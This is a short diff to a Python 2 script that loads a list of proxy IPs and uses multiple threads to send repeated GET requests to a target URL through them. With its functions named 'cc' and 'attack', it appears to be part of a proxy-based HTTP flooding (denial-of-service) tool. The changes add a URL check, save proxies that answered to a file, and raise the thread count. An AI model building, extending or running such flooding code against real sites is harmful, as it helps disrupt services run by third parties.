@@ -21,6 +21,10 @@ if len(sys.argv) == 1:
 TARGET = sys.argv[1]
 IPFILES = sys.argv[2] if len(sys.argv) == 3 else 'output/proxy_ips.txt'
 
+if 'http' not in TARGET:
+    print "[-] url is error"
+    exit(1)
+
 proxy_ip = Queue.Queue()
 with open(IPFILES,'r') as f:
     for line in f.readlines():
@@ -32,6 +36,8 @@ def cc(proxy_ip):
         r = requests.get(TARGET, headers=HEADERS,timeout=8, proxies={'http':proxy_ip})
         if r.status_code == 200:
             print proxy_ip
+            with open('output/proxy_ip.txt','a') as f:
+                f.writelines(proxy_ip + '\n')
     except:
         pass
 
@@ -41,7 +47,7 @@ def attack():
 
 def main():
     threads_list = []
-    threads = 16
+    threads = 18
 
     for i in range(threads):
         t = Thread(target=attack)
